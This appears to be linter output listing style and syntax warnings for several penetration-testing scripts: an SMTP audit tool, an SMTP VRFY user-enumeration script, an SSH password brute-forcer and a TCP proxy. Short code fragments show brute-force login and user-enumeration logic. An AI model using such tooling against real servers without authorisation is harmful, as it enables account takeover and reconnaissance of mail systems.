    --> security\penetration-testing-tools\networks\smtpAudit.py:4078:9
     |
4076 |         dbg("Offered cipher: {} and version: {}".format(cipherUsed, version))
4077 |
4078 |         keyLen = cipherUsed[2] * 8
     |         ^^^^^^
4079 |         if keyLen < config["key_len"]:
4080 |             fail(
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4081:17
     |
4079 |           if keyLen < config["key_len"]:
4080 |               fail(
4081 | /                 "UNSECURE: SSL/TLS negotiated cipher's ({}) key length is insufficient: {} bits".format(
4082 | |                     cipherUsed[0], keyLen
4083 | |                 )
     | |_________________^
4084 |               )
4085 |           elif sharedCiphers != None and len(sharedCiphers) > 0:
     |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\networks\smtpAudit.py:4085:31
     |
4083 |                 )
4084 |             )
4085 |         elif sharedCiphers != None and len(sharedCiphers) > 0:
     |                               ^^^^
4086 |             for ciph in sharedCiphers:
4087 |                 name, ver, length = ciph
     |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4090:25
     |
4088 |                   if length * 8 < 1024:
4089 |                       fail(
4090 | /                         "UNSECURE: SMTP server offers SSL/TLS cipher suite ({}) which key length is insufficient: {} bits".format(
4091 | |                             name, keyLen
4092 | |                         )
     | |_________________________^
4093 |                       )
4094 |                       return False
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4097:17
     |
4096 |               ok(
4097 | /                 "SECURE: SSL/TLS negotiated key length is sufficient ({} bits).".format(
4098 | |                     keyLen
4099 | |                 )
     | |_________________^
4100 |               )
4101 |           else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4117:17
     |
4115 |           if not self.spfValidated:
4116 |               dbg(
4117 | /                 'Sending half-mail to domain: "{}" to trigger SPF/Accepted Domains'.format(
4118 | |                     self.mailDomain
4119 | |                 )
     | |_________________^
4120 |               )
4121 |               self._openRelayTest(
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4132:18
     |
4130 |             ok("SECURE: SMTP Server validates sender's SPF record")
4131 |             info("\tor is using MS Exchange's Accepted Domains mechanism.")
4132 |             _out("\tReturned: {}".format(self.spfValidated))
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4133 |             return True
4134 |         else:
     |
help: Convert to f-string

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\smtpAudit.py:4158:9
     |
4156 |                 info("Looks like we might be dealing with Microsoft Exchange")
4157 |                 return True
4158 |         except:
     |         ^^^^^^
4159 |             pass
     |

N806 Variable `spfErrorCodes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4164:9
     |
4163 |     def processResponseForSpfFailure(self, out):
4164 |         spfErrorCodes = (
     |         ^^^^^^^^^^^^^
4165 |             250,
4166 |             451,
     |

N806 Variable `spfErrorKnownSentences` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4170:9
     |
4168 |             554,
4169 |         )
4170 |         spfErrorKnownSentences = ("Client host rejected: Access denied",)
     |         ^^^^^^^^^^^^^^^^^^^^^^
4171 |         spfErrorKeywords = (
4172 |             "validat",
     |

N806 Variable `spfErrorKeywords` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4171:9
     |
4169 |         )
4170 |         spfErrorKnownSentences = ("Client host rejected: Access denied",)
4171 |         spfErrorKeywords = (
     |         ^^^^^^^^^^^^^^^^
4172 |             "validat",
4173 |             "host rejected",
     |

N806 Variable `knownSentence` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4186:17
     |
4185 |             # Maybe this error is already known?
4186 |             for knownSentence in spfErrorKnownSentences:
     |                 ^^^^^^^^^^^^^
4187 |                 if knownSentence in msg:
4188 |                     dbg(
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4189:25
     |
4187 |                   if knownSentence in msg:
4188 |                       dbg(
4189 | /                         "SPF validation found when received well-known SPF failure error: {} ({})".format(
4190 | |                             out[0], msg
4191 | |                         )
     | |_________________________^
4192 |                       )
4193 |                       return True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4207:21
     |
4205 |               if found > 0:
4206 |                   dbg(
4207 | /                     "SPF validation possibly found but unsure ({} keywords related): {} ({})".format(
4208 | |                         found, out[0], msg
4209 | |                     )
     | |_____________________^
4210 |                   )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4219:18
     |
4218 |         if self.processResponseForSpfFailure(out):
4219 |             info("SPF validation found: {} ({})".format(out[0], out[1].decode()))
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4220 |             self.spfValidated = "{} ({})".format(out[0], out[1].decode())
4221 |             return True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4220:33
     |
4218 |         if self.processResponseForSpfFailure(out):
4219 |             info("SPF validation found: {} ({})".format(out[0], out[1].decode()))
4220 |             self.spfValidated = "{} ({})".format(out[0], out[1].decode())
     |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4221 |             return True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4225:17
     |
4223 |           if self.processResponseForAcceptedDomainsFailure(out):
4224 |               info(
4225 | /                 "SPF validation not found but found enabled Microsoft Exchange Accepted Domains mechanism: {} ({})".format(
4226 | |                     out[0], out[1].decode()
4227 | |                 )
     | |_________________^
4228 |               )
4229 |               self.spfValidated = "{} ({})".format(out[0], out[1].decode())
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4229:33
     |
4227 |                 )
4228 |             )
4229 |             self.spfValidated = "{} ({})".format(out[0], out[1].decode())
     |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4230 |             return False
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4314:18
     |
4312 |               type=str,
4313 |               default="all",
4314 |               help="Select specific tests to conduct. For a list of tests"
     |  __________________^
4315 | |             ', launch the program with option: "{} -T tests". Add more tests after colon. (Default: run all tests).'.format(
4316 | |                 argv[0]
4317 | |             ),
     | |_____________^
4318 |           )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4327:18
     |
4325 |               type=str,
4326 |               default="",
4327 |               help="Select specific tests to skip. For a list of tests"
     |  __________________^
4328 | |             ', launch the program with option: "{} -T tests". Add more tests after colon. (Default: run all tests).'.format(
4329 | |                 argv[0]
4330 | |             ),
     | |_____________^
4331 |           )
     |
help: Convert to f-string

N806 Variable `openRelay` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4414:9
     |
4413 |         # Open-Relay options
4414 |         openRelay = self.parser.add_argument_group("Open-Relay Tests")
     |         ^^^^^^^^^
4415 |         openRelay.add_argument(
4416 |             "-x",
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4454:13
     |
4452 |       def banner():
4453 |           sys.stderr.write(
4454 | /             """
4455 | |     :: SMTP Black-Box Audit tool.
4456 | |     v{}, Mariusz Banach / mgeeky, '17
4457 | |
4458 | | """.format(
4459 | |                 VERSION
4460 | |             )
     | |_____________^
4461 |           )
     |
help: Convert to f-string

N806 Variable `testsHelp` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4470:9
     |
4468 |         global config
4469 |
4470 |         testsHelp = ""
     |         ^^^^^^^^^
4471 |         for k, v in SmtpTester.testsConducted.items():
4472 |             testsHelp += "\n\t{:20s} - {}".format(k, v)
     |

N806 Variable `testsHelp` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4472:13
     |
4470 |         testsHelp = ""
4471 |         for k, v in SmtpTester.testsConducted.items():
4472 |             testsHelp += "\n\t{:20s} - {}".format(k, v)
     |             ^^^^^^^^^
4473 |
4474 |         if len(sys.argv) >= 2:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4472:26
     |
4470 |         testsHelp = ""
4471 |         for k, v in SmtpTester.testsConducted.items():
4472 |             testsHelp += "\n\t{:20s} - {}".format(k, v)
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4473 |
4474 |         if len(sys.argv) >= 2:
     |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\networks\smtpAudit.py:4474:9
     |
4472 |               testsHelp += "\n\t{:20s} - {}".format(k, v)
4473 |
4474 | /         if len(sys.argv) >= 2:
4475 | |             if (
4476 | |                 (sys.argv[1].lower() == "--list-tests")
4477 | |                 or (
4478 | |                     sys.argv[1] == "-T"
4479 | |                     and len(sys.argv) >= 3
4480 | |                     and sys.argv[2] == "tests"
4481 | |                 )
4482 | |                 or (sys.argv[1] == "-T")
4483 | |                 or (
4484 | |                     sys.argv[1] == "--list-tests"
4485 | |                     and len(sys.argv) >= 3
4486 | |                     and sys.argv[2] == "tests"
4487 | |                 )
4488 | |             ):
     | |______________^
4489 |                   print("Available tests:{}".format(testsHelp))
4490 |                   sys.exit(0)
     |
help: Combine `if` statements using `and`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4489:23
     |
4487 |                 )
4488 |             ):
4489 |                 print("Available tests:{}".format(testsHelp))
     |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4490 |                 sys.exit(0)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4495:19
     |
4494 |         if args.testsHelp:
4495 |             print("Available tests:{}".format(testsHelp))
     |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4496 |             sys.exit(0)
     |
help: Convert to f-string

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\networks\smtpAudit.py:4537:20
     |
4535 |                 if c == "all":
4536 |                     continue
4537 |                 if c not in SmtpTester.testsConducted.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4538 |                     err('There is no such test as the one specified: "{}"'.format(c))
4539 |                     print("\nAvailable tests:{}".format(testsHelp))
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4538:25
     |
4536 |                     continue
4537 |                 if c not in SmtpTester.testsConducted.keys():
4538 |                     err('There is no such test as the one specified: "{}"'.format(c))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4539 |                     print("\nAvailable tests:{}".format(testsHelp))
4540 |                     sys.exit(-1)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4539:27
     |
4537 |                 if c not in SmtpTester.testsConducted.keys():
4538 |                     err('There is no such test as the one specified: "{}"'.format(c))
4539 |                     print("\nAvailable tests:{}".format(testsHelp))
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4540 |                     sys.exit(-1)
     |
help: Convert to f-string

E741 Ambiguous variable name: `l`
    --> security\penetration-testing-tools\networks\smtpAudit.py:4542:13
     |
4540 |                     sys.exit(-1)
4541 |
4542 |             l = list(filter(lambda x: x != "all", config["tests_to_carry"]))
     |             ^
4543 |             if l:
4544 |                 info("Running following tests: " + ", ".join(l))
     |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\networks\smtpAudit.py:4551:20
     |
4549 |                 if c == "":
4550 |                     break
4551 |                 if c not in SmtpTester.testsConducted.keys():
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4552 |                     err('There is no such test as the one specified: "{}"'.format(c))
4553 |                     print("\nAvailable tests:{}".format(testsHelp))
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4552:25
     |
4550 |                     break
4551 |                 if c not in SmtpTester.testsConducted.keys():
4552 |                     err('There is no such test as the one specified: "{}"'.format(c))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4553 |                     print("\nAvailable tests:{}".format(testsHelp))
4554 |                     sys.exit(-1)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4553:27
     |
4551 |                 if c not in SmtpTester.testsConducted.keys():
4552 |                     err('There is no such test as the one specified: "{}"'.format(c))
4553 |                     print("\nAvailable tests:{}".format(testsHelp))
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4554 |                     sys.exit(-1)
     |
help: Convert to f-string

E741 Ambiguous variable name: `l`
    --> security\penetration-testing-tools\networks\smtpAudit.py:4556:13
     |
4554 |                     sys.exit(-1)
4555 |
4556 |             l = list(filter(lambda x: x != "", config["tests_to_skip"]))
     |             ^
4557 |             if l:
4558 |                 info("Skipping following tests: " + ", ".join(l))
     |

N803 Argument name `auditMode` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4563:27
     |
4563 | def printResults(results, auditMode):
     |                           ^^^^^^^^^
4564 |     if auditMode:
4565 |         if config["format"] == "json":
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4602:13
     |
4600 |       if config["format"] == "text":
4601 |           sys.stderr.write(
4602 | /             """
4603 | |     :: SMTP configuration Audit / Penetration-testing tool
4604 | |     Intended to be used as a black-box tool revealing security state of SMTP.
4605 | |     Mariusz Banach / mgeeky, '17-19
4606 | |     v{}
4607 | |
4608 | | """.format(
4609 | |                 VERSION
4610 | |             )
     | |_____________^
4611 |           )
     |
help: Convert to f-string

F522 [*] `.format` call has unused named argument(s): toOutLine
    --> security\penetration-testing-tools\networks\smtpAudit.py:4620:9
     |
4618 |       )
4619 |       info(
4620 | /         "Running against target: {}{}{}".format(
4621 | |             opts.domain,
4622 | |             ":" + str(opts.port) if opts.port != None else "",
4623 | |             " (...@" + opts.maildomain + ")" if opts.maildomain != "" else "",
4624 | |             toOutLine=True,
4625 | |         )
     | |_________^
4626 |       )
     |
help: Remove extra named arguments: toOutLine

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\networks\smtpAudit.py:4622:50
     |
4620 |         "Running against target: {}{}{}".format(
4621 |             opts.domain,
4622 |             ":" + str(opts.port) if opts.port != None else "",
     |                                                  ^^^^
4623 |             " (...@" + opts.maildomain + ")" if opts.maildomain != "" else "",
4624 |             toOutLine=True,
     |
help: Replace with `cond is not None`

SIM108 Use ternary operator `results = tester.runAttacks() if opts.attack else tester.runTests()` instead of `if`-`else`-block
    --> security\penetration-testing-tools\networks\smtpAudit.py:4639:9
     |
4638 |       try:
4639 | /         if opts.attack:
4640 | |             results = tester.runAttacks()
4641 | |         else:
4642 | |             results = tester.runTests()
     | |_______________________________________^
4643 |
4644 |       except KeyboardInterrupt:
     |
help: Replace `if`-`else`-block with `results = tester.runAttacks() if opts.attack else tester.runTests()`

W291 Trailing whitespace
  --> security\penetration-testing-tools\networks\smtpvrfy.py:20:53
   |
18 |     code = int(resp.split(' ')[0])
19 |     messages = {
20 |         250:'Requested mail action okay, completed', 
   |                                                     ^
21 |         251:'User not local; will forward to <forward-path>', 
22 |         252:'Cannot VRFY user, but will accept message and attempt delivery', 
   |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> security\penetration-testing-tools\networks\smtpvrfy.py:21:62
   |
19 |     messages = {
20 |         250:'Requested mail action okay, completed', 
21 |         251:'User not local; will forward to <forward-path>', 
   |                                                              ^
22 |         252:'Cannot VRFY user, but will accept message and attempt delivery', 
23 |         502:'Command not implemented', 
   |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> security\penetration-testing-tools\networks\smtpvrfy.py:22:78
   |
20 |         250:'Requested mail action okay, completed', 
21 |         251:'User not local; will forward to <forward-path>', 
22 |         252:'Cannot VRFY user, but will accept message and attempt delivery', 
   |                                                                              ^
23 |         502:'Command not implemented', 
24 |         530:'Access denied (???a Sendmailism)', 
   |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> security\penetration-testing-tools\networks\smtpvrfy.py:23:39
   |
21 |         251:'User not local; will forward to <forward-path>', 
22 |         252:'Cannot VRFY user, but will accept message and attempt delivery', 
23 |         502:'Command not implemented', 
   |                                       ^
24 |         530:'Access denied (???a Sendmailism)', 
25 |         550:'Requested action not taken: mailbox unavailable', 
   |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> security\penetration-testing-tools\networks\smtpvrfy.py:24:48
   |
22 |         252:'Cannot VRFY user, but will accept message and attempt delivery', 
23 |         502:'Command not implemented', 
24 |         530:'Access denied (???a Sendmailism)', 
   |                                                ^
25 |         550:'Requested action not taken: mailbox unavailable', 
26 |         551:'User not local; please try <forward-path>', 
   |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> security\penetration-testing-tools\networks\smtpvrfy.py:25:63
   |
23 |         502:'Command not implemented', 
24 |         530:'Access denied (???a Sendmailism)', 
25 |         550:'Requested action not taken: mailbox unavailable', 
   |                                                               ^
26 |         551:'User not local; please try <forward-path>', 
27 |     }
   |
help: Remove trailing whitespace

W291 Trailing whitespace
  --> security\penetration-testing-tools\networks\smtpvrfy.py:26:57
   |
24 |         530:'Access denied (???a Sendmailism)', 
25 |         550:'Requested action not taken: mailbox unavailable', 
26 |         551:'User not local; please try <forward-path>', 
   |                                                         ^
27 |     }
   |
help: Remove trailing whitespace

W293 Blank line contains whitespace
  --> security\penetration-testing-tools\networks\smtpvrfy.py:28:1
   |
26 |         551:'User not local; please try <forward-path>', 
27 |     }
28 |     
   | ^^^^
29 |     if code in messages.keys():
30 |         return '({} {})'.format(code, messages[code])
   |
help: Remove whitespace from blank line

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
  --> security\penetration-testing-tools\networks\smtpvrfy.py:41:12
   |
39 |     try:
40 |         conn = s.connect((server, port))
41 |     except socket.error, e:
   |            ^^^^^^^^^^^^^^^
42 |         print '[!] Connection failed with {}:{} - "{}"'.format(server, port, str(e))
43 |         return False
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:42:15
   |
40 |         conn = s.connect((server, port))
41 |     except socket.error, e:
42 |         print '[!] Connection failed with {}:{} - "{}"'.format(server, port, str(e))
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
43 |         return False
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:46:15
   |
45 |     try:
46 |         print '[+] Service banner: "{}"'.format(s.recv(1024).strip())
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^
47 |         s.send('HELO test@test.com\r\n')
48 |         print '[>] Response for HELO from {}:{} - '.format(server, port) + s.recv(1024).strip()
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:48:15
   |
46 |         print '[+] Service banner: "{}"'.format(s.recv(1024).strip())
47 |         s.send('HELO test@test.com\r\n')
48 |         print '[>] Response for HELO from {}:{} - '.format(server, port) + s.recv(1024).strip()
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
49 |
50 |     except socket.error, e:
   |

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
  --> security\penetration-testing-tools\networks\smtpvrfy.py:50:12
   |
48 |         print '[>] Response for HELO from {}:{} - '.format(server, port) + s.recv(1024).strip()
49 |
50 |     except socket.error, e:
   |            ^^^^^^^^^^^^^^^
51 |         print '[!] Failed at initial session setup: "{}"'.format(str(e))
52 |         return False
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:51:15
   |
50 |     except socket.error, e:
51 |         print '[!] Failed at initial session setup: "{}"'.format(str(e))
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
52 |         return False
   |

W293 Blank line contains whitespace
  --> security\penetration-testing-tools\networks\smtpvrfy.py:53:1
   |
51 |         print '[!] Failed at initial session setup: "{}"'.format(str(e))
52 |         return False
53 |     
   | ^^^^
54 |     if brute:
55 |         print '[?] Engaging brute-force enumeration...'
   |
help: Remove whitespace from blank line

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:55:15
   |
54 |     if brute:
55 |         print '[?] Engaging brute-force enumeration...'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:63:19
   |
61 |             s.send('VRFY ' + user + '\r\n')
62 |             res = s.recv(1024).strip()
63 |             print '({}/{}) Server: {}:{} | VRFY {} | Result: [{}]'.format(
   |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
64 |                 i, len(username), server, port, user, interpret_smtp_status_code(res))
65 |     else:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:69:15
   |
67 |         res = s.recv(1024).strip()
68 |
69 |         print '[>] Response from {}:{} - '.format(server, port) + interpret_smtp_status_code(res)
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
70 |         if 'User unknown' in res:
71 |             print '[!] User not found.'
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:71:19
   |
69 |         print '[>] Response from {}:{} - '.format(server, port) + interpret_smtp_status_code(res)
70 |         if 'User unknown' in res:
71 |             print '[!] User not found.'
   |                   ^^^^^^^^^^^^^^^^^^^^^
72 |         elif (res.startswith('25') and username in res and '<' in res and '>' in res):
73 |             print '[+] User found: "{}"'.format(res.strip())
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:73:19
   |
71 |             print '[!] User not found.'
72 |         elif (res.startswith('25') and username in res and '<' in res and '>' in res):
73 |             print '[+] User found: "{}"'.format(res.strip())
   |                   ^^^^^^^^^^^^^^^^^^^^^^
74 |         else:
75 |             print '[?] Response: "{}"'.format(res.strip())
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:75:19
   |
73 |             print '[+] User found: "{}"'.format(res.strip())
74 |         else:
75 |             print '[?] Response: "{}"'.format(res.strip())
   |                   ^^^^^^^^^^^^^^^^^^^^
76 |
77 |     s.close()
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:81:15
   |
79 | if __name__ == '__main__':
80 |     if len(sys.argv) < 2:
81 |         print '[?] Usage: smtpvrfy.py <smtpserver> [username|wordlist] [timeout]'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
82 |         print '\t(to specify a port provide it after a colon \':\' in server parameter)'
83 |         sys.exit(0)
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:82:15
   |
80 |     if len(sys.argv) < 2:
81 |         print '[?] Usage: smtpvrfy.py <smtpserver> [username|wordlist] [timeout]'
82 |         print '\t(to specify a port provide it after a colon \':\' in server parameter)'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
83 |         sys.exit(0)
   |

W291 Trailing whitespace
  --> security\penetration-testing-tools\networks\smtpvrfy.py:91:19
   |
90 |     if os.path.isfile(username):
91 |         names = [] 
   |                   ^
92 |         with open(username, 'r') as f:
93 |             for a in f:
   |
help: Remove trailing whitespace

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\smtpvrfy.py:95:15
   |
93 |             for a in f:
94 |                 names.append(a.strip())
95 |         print '[>] Provided wordlist file with {} entries.'.format(len(names))
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
96 |         vrfy(server, names, port, timeout, brute=True)
97 |     else:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\sshbrute.py:21:11
   |
19 |     s.sendline(cmd)
20 |     s.prompt()
21 |     print s.before
   |           ^
22 |
23 | def connect(host, user, password, release):
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\sshbrute.py:29:15
   |
27 |         s = pxssh.pxssh()
28 |         s.login(host, user, password)
29 |         print '\n\n[+] Password found: ' + password + '\n\n'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^
30 |         FOUND = True
31 |         return s
   |

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
  --> security\penetration-testing-tools\networks\sshbrute.py:32:12
   |
30 |         FOUND = True
31 |         return s
32 |     except Exception, e:
   |            ^^^^^^^^^^^^
33 |         if 'read_nonblocking' in str(e):
34 |             FAILS += 1
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\sshbrute.py:47:15
   |
46 |     if len(argv) < 4:
47 |         print 'Usage: sshbrute.py host user passwords_list'
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
48 |         return
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\sshbrute.py:58:19
   |
56 |         i += 1
57 |         if FOUND:
58 |             print '[*] Password found.'
   |                   ^^^^^^^^^^^^^^^^^^^^^
59 |             exit(0)
60 |         if FAILS > 5:
   |

invalid-syntax: Simple statements must be separated by newlines or semicolons
  --> security\penetration-testing-tools\networks\sshbrute.py:61:19
   |
59 |             exit(0)
60 |         if FAILS > 5:
61 |             print '[!] Exiting: Too many socket timeouts'
   |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
62 |             exit(0)
   |

F821 Undefined name `unicode`
  --> security\penetration-testing-tools\networks\tcpproxy.py:73:35
   |
71 | def hexdump(src, length=16):
72 |     result = []
73 |     digits = 4 if isinstance(src, unicode) else 2
   |                                   ^^^^^^^
74 |     num = len(src)
   |

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\networks\tcpproxy.py:78:27
   |
76 |     for i in range(0, num, length):
77 |         s = src[i : i + length]
78 |         hexa = b" ".join(["%0*X" % (digits, ord(x)) for x in s])
   |                           ^^^^^^
79 |         text = b"".join([x if 0x20 <= ord(x) < 0x7F else b"." for x in s])
   |
help: Replace with format specifiers

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\tcpproxy.py:100:5
    |
 99 |             buff += data
100 |     except:
    |     ^^^^^^
101 |         pass
    |

N803 Argument name `clientSock` should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:106:18
    |
106 | def proxyHandler(clientSock, remoteHost, remotePort, recvFirst):
    |                  ^^^^^^^^^^
107 |     Logger.dbg("Connecting to REMOTE service: {}:{}".format(remoteHost, remotePort))
    |

N803 Argument name `remoteHost` should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:106:30
    |
106 | def proxyHandler(clientSock, remoteHost, remotePort, recvFirst):
    |                              ^^^^^^^^^^
107 |     Logger.dbg("Connecting to REMOTE service: {}:{}".format(remoteHost, remotePort))
    |

N803 Argument name `remotePort` should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:106:42
    |
106 | def proxyHandler(clientSock, remoteHost, remotePort, recvFirst):
    |                                          ^^^^^^^^^^
107 |     Logger.dbg("Connecting to REMOTE service: {}:{}".format(remoteHost, remotePort))
    |

N803 Argument name `recvFirst` should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:106:54
    |
106 | def proxyHandler(clientSock, remoteHost, remotePort, recvFirst):
    |                                                      ^^^^^^^^^
107 |     Logger.dbg("Connecting to REMOTE service: {}:{}".format(remoteHost, remotePort))
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\tcpproxy.py:107:16
    |
106 | def proxyHandler(clientSock, remoteHost, remotePort, recvFirst):
107 |     Logger.dbg("Connecting to REMOTE service: {}:{}".format(remoteHost, remotePort))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
108 |
109 |     try:
    |
help: Convert to f-string

N806 Variable `remoteSock` in function should be lowercase
   --> security\penetration-testing-tools\networks\tcpproxy.py:110:9
    |
109 |     try:
110 |         remoteSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
